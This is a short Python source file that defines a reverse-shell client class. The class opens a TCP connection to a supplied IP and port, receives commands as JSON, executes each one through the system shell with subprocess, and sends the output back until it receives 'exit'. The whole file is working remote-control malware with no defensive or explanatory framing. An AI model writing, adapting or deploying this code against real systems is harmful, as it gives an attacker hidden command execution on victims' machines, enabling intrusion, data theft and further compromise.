import socket
import subprocess
import json


class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    @staticmethod
    def command_execute(commands):
        try:
            return subprocess.check_output(
                commands,
                shell=True,
                text=True,
                stderr=subprocess.STDOUT,
            )
        except subprocess.CalledProcessError as error:
            return error.output or str(error)

    def send_json(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        json_data = self.my_connection.recv(1024)
        return json.loads(json_data.decode())

    def start_socket(self):
        while True:
            command = self.json_receive()
            if command.lower() == "exit":
                break
            command_output = self.command_execute(command)
            self.send_json(command_output)
        self.my_connection.close()
